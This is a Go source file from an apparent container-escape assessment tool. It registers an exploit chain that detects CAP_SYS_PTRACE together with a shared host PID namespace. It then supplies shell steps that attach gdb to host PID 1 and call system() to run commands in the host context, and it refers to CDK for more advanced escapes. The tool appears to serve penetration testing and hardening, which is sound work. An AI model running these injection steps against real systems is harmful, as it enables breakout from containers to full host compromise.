package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// sysPtracePivot — CAP_SYS_PTRACE inside a workload that shares the
// host PID namespace lets you attach to host processes (typically PID 1)
// and inject code.
type sysPtracePivot struct{ exploit.Base }

func (c *sysPtracePivot) Matches(results []check.Result) *exploit.Match {
	hasPtrace := exploit.EvidenceContains(results, "container.capabilities.dangerous", "CAP_SYS_PTRACE")
	hasHostPID := exploit.HasFailedID(results, "host.pid_namespace")
	if !hasPtrace || !hasHostPID {
		return nil
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"container.capabilities.dangerous", "host.pid_namespace"},
		Confidence: "high",
	}
}

func (c *sysPtracePivot) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title:   "Confirm PID namespace is shared and ptrace is allowed",
			Command: `ls -la /proc/1/ns/pid; readlink /proc/1/ns/pid`,
			Note:    "If 1's pid ns matches yours, you're in host PID. ptrace_scope==0 helps too.",
		},
		{
			Title: "Inject into PID 1 using gdb",
			Command: `apk add --no-cache gdb 2>/dev/null || apt-get install -y gdb 2>/dev/null
gdb -p 1 <<'GDB'
call (int) system("id > /tmp/ptrace_loot")
detach
quit
GDB
cat /tmp/ptrace_loot`,
			Note: "Spawns a host-context shell command via PID 1. For more sophistication, use tools like `cdk run k8s-trampoline`.",
		},
	}
}

func init() {
	exploit.Register(&sysPtracePivot{Base: exploit.Base{
		IDValue:       "chain.sys_ptrace_pivot",
		NameValue:     "CAP_SYS_PTRACE + hostPID → host code exec",
		GoalValue:     "Inject commands into host PID 1 by attaching with ptrace.",
		RiskValue:     exploit.RiskDestructive,
		SeverityValue: check.SeverityCritical,
		ReferencesValue: []string{
			"https://man7.org/linux/man-pages/man2/ptrace.2.html",
			"https://github.com/cdk-team/CDK",
		},
		AttackValue: []string{"T1611", "T1055.008"},
	}})
}
